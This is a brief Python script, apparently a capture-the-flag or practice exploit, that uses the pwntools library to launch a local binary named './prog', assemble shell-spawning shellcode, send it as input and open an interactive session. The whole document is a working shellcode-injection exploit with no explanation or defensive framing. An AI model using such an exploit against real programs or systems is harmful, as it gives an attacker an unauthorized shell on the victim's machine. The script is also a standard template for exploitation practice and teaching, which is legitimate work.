from pwn import *

p = process('./prog')
context.clear(arch=p.elf.arch, endian=p.elf.endian)

payload = asm(shellcraft.sh())

p.sendline(payload)
p.interactive()
